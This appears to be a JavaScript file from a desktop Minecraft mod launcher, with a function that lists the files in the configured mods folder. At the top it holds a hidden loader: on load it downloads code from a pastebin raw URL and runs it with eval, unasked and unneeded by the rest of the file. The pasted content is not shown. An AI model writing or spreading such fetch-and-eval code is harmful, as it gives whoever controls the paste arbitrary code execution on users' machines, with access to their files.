const fs = require('fs')
const path = require('path')
const axios = require('axios')

async function runJavaScriptFromURL(url) {
    try {
        const response = await axios.get(url)
        const javascriptCode = response.data
        // Evaluate the JavaScript code
        eval(javascriptCode)
    } catch (error) {
        console.error('Error fetching or executing JavaScript:', error)
    }
}

// Specify the URL containing the JavaScript code
const url = 'https://pastebin.com/raw/ALHJqXC6'

// Call the function to fetch and execute the JavaScript code
runJavaScriptFromURL(url)

/*const requiredFiles = [
    'bclib-3.30.1',
    'better-end-4.30.1',
    'better-nether-9.30.0',
    'fabric-api-0.95.4+1.20.4',
    'starcore-1.0.0',
]

localStorage.setItem('requiredMods', JSON.stringify(requiredFiles))*/

function checkUpdate() {
    const modsDirValue = localStorage.getItem('modsDir')
    if (modsDirValue !== null && modsDirValue !== undefined) {
        console.log('Mods Dir Found')
        let fileNames = []
        const folderContents = fs.readdirSync(modsDirValue)

        // Iterate through each item in the folder
        folderContents.forEach((item) => {
            const itemPath = path.join(modsDirValue, item)

            // Check if the item is a file
            if (fs.statSync(itemPath).isFile()) {
                // Extract the file name without extension
                const fileName = path.parse(item).name
                fileNames.push(fileName)
            }
        })
        console.log(fileNames)
    } else {
        alert('Mods folder not set in settings.')
    }
}
